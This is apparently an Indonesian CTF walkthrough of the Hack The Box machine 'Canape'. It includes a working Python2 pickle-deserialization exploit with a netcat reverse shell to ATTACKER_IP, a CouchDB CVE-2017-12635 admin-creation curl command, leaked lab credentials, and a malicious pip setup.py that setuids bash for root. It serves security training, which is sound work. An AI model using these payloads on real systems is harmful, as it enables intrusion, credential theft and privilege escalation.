## **Informasi Mesin**
- **Nama**: Canape
- **OS**: Linux
- **Difficulty**: Medium
- **IP**: 10.129.26.183
### **Scanning Port**
```bash
rustscan -a 10.129.26.183 --ulimit 1000 -r 1-65535 -- -A -sC -Pn
65535
80
```

### **Fuzzing Direktori Web**
```bash
wfuzz --hw=1 --hh=3076 -w /home/greed/SecLists-master/Discovery/Web-Content/raft-medium-words.txt http://10.129.26.183/FUZZ

000000272:   301        9 L      28 W       317 Ch      "static"                                                                                                       
000000474:   200        81 L     167 W      2836 Ch     "submit"                                                                                                                     
000001218:   405        4 L      23 W       178 Ch      "check"                                                                                                                      
000001440:   500        4 L      40 W       291 Ch      "quotes"                                                                                                                     
000004659:   403        9 L      28 W       279 Ch      "server-status"                                                                                                              
000005919:   301        9 L      28 W       315 Ch      ".git"

```

## 🎯 **Eksploitasi**

### **1. Analisis Source Code .git**

Dengan mengakses `.git` directory, kita dapat mendownload source code aplikasi
```bash
git-dumper http://10.129.26.137/.git/ downloaded_git
```
### **2. Identifikasi Vulnerability**

Pada file `__init__.py` ditemukan **Python Pickle Deserialization RCE**:

```python
@app.route("/check", methods=["POST"])
def check():
    path = "/tmp/" + request.form["id"] + ".p"
    data = open(path, "rb").read()

    if "p1" in data:
        item = cPickle.loads(data)  # ⚠️ VULNERABILITY!
    else:
        item = data

    return "Still reviewing: " + item
```
### **3. Membuat Exploit**

Karena server menggunakan Python2, kita perlu membuat exploit dengan Python2:
```python
#!/usr/bin/env python2
import cPickle
import os
import requests
import sys
from hashlib import md5

class Exploit(object):
    def __init__(self, cmd):
        self.cmd = cmd
    def __reduce__(self):
        return (os.system, ('echo moe && ' + self.cmd,))

# Reverse shell payload
cmd = "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP 4444 > /tmp/f"
exploit = cPickle.dumps(Exploit(cmd))

# Split payload untuk bypass whitelist
char = exploit[:-1]
quote = exploit[-1:]
id_ = md5(char+quote).hexdigest()

# Kirim payload
requests.post('http://10.129.26.183/submit', data={'character': char, 'quote': quote})
requests.post('http://10.129.26.183/check', data={'id': id_})
```
### **4. Mendapatkan Initial Shell**

Setelah menjalankan exploit, kita mendapatkan shell sebagai user `www-data`.

## 🔥 **Privilege Escalation - User Homer**

### **1. Eksploitasi CouchDB**

Ditemukan database CouchDB yang vulnerable (CVE-2017-12635):

```bash
# Buat user admin tanpa authentication
curl -X PUT -d '{"type":"user","name":"greed","roles":["_admin"],"roles":[],"password":"df"}' \
http://localhost:5984/_users/org.couchdb.user:greed -H "Content-Type:application/json"
```

### **2. Akses Database Passwords**

Dengan akses admin, kita dapat membaca database `passwords`:

```bash
curl -s -u greed:df "http://localhost:5984/passwords/_all_docs?include_docs=true"
```

**Credentials yang Ditemukan:**

- **SSH**: `0B4jyA0xtytZi7esBNGp`
    
- **Website**: `homer:h02ddjdj2k2k2`

```bash
ssh homer@10.129.26.183 -p 65535
The authenticity of host '[10.129.26.183]:65535 ([10.129.26.183]:65535)' can't be established.
ED25519 key fingerprint is SHA256:fnOGcxmSP9f1PLBisr/nYMZP1ilGixOYS2kCQnYynxc.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.129.26.183]:65535' (ED25519) to the list of known hosts.
homer@10.129.26.183's password: 
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-213-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Last login: Thu Nov 23 07:33:11 2023 from 10.10.14.23
homer@canape:~$ 

```

## 🚀 **Privilege Escalation - Root**

### **1. Check Sudo Privileges**
```bash
sudo -l
[sudo] password for homer: 
Matching Defaults entries for homer on canape:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User homer may run the following commands on canape:
    (root) /usr/bin/pip install *
```

### **2. Exploit Pip Install**

Buat malicious Python package:

**setup.py**
```python
from setuptools import setup
from setuptools.command.install import install
import os

class Exploit(install):
    def run(self):
        os.system('chmod +s /bin/bash')
        install.run(self)

setup(
    name='exploit',
    version='1.0',
    description='Exploit',
    author='greed',
    license='MIT',
    zip_safe=False,
    cmdclass={'install': Exploit}
)

```
### **3. Execute Exploit**

```bash
mkdir /tmp/exploit_pkg

# Copy setup.py ke /tmp/exploit_pkg/
sudo /usr/bin/pip install /tmp/exploit_pkg/
```

### **4. Mendapatkan Root Shell**

```bash
/bin/bash -p
whoami
```
# root

## 🏆 **Flags**

### **User Flag**

```bash
cat /home/homer/user.txt
a5c5fc5bd****************
```

### **Root Flag**

```bash
cat /root/root.txt
6dea2b40e****************
```

## 💡 **Lesson Learned**

1. **Jangan expose .git directory** di production
    
2. **Hindari pickle deserialization** dari user input
    
3. **Secure CouchDB configuration** dengan authentication
    
4. **Batasi sudo privileges** dan gunakan full path dalam sudoers
    
5. **Gunakan Python virtual environments** untuk membatasi akses pip